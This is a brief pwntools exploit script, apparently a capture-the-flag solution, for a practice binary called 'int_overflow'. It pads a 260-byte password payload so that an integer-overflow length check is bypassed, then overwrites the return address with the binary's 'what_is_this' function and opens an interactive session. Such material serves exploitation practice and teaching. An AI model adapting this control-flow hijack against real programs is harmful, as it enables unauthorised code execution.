from pwn import *
# https://sphandsomejack.github.io/2020/02/01/int_overflow/
sh = process("./int_overflow")
elf = ELF("./int_overflow")

system_addr = elf.symbols['what_is_this']
payload = b'a'*24 + p32(system_addr)
payload = payload.ljust(260, b'a')

sh.sendlineafter("choice:", '1')
sh.sendlineafter("username:", 'aaa')
sh.sendlineafter("passwd:", payload)
sh.interactive()